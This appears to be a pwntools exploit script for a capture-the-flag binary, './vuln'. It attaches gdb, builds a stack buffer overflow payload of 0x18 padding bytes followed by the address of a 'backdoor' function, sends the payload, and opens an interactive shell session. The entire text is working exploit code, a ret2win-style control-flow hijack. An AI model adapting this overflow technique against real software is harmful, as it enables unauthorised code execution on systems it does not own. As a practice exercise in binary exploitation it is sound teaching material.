from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./vuln')
gdb.attach(p, "break *0x40126c")

input('>')
backdoor = 0x4011b6
payload = b'A' * 0x18
payload += p64(backdoor)
p.sendline(payload)

p.interactive()
